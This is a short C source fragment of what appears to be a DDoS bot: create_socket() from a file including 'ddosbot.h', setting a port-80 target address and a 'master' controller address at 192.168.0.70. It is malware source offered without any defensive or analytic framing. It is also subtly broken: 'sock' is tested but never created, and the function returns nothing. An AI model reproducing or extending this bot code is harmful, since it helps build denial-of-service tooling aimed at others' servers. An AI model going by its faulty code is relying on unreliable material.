#include "ddosbot.h"

int create_socket() {

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		perror("WSAStart Error ");
		system("pause");
		return -1;
	}


	if (sock == INVALID_SOCKET) {
		perror("Sock Error ");
		system("pause");
		return -1;
	}

	host = gethostbyname("localhost");

	target_addr.sin_family = AF_INET;
	target_addr.sin_port = htons(80);
	target_addr.sin_addr.s_addr = inet_addr(inet_ntoa(*(struct in_addr*)*host->h_addr_list));

	master_addr.sin_family = AF_INET;
	master_addr.sin_port = htons(atoi(DEFAULT_PORT));
	master_addr.sin_addr.s_addr = inet_addr("192.168.0.70");

}
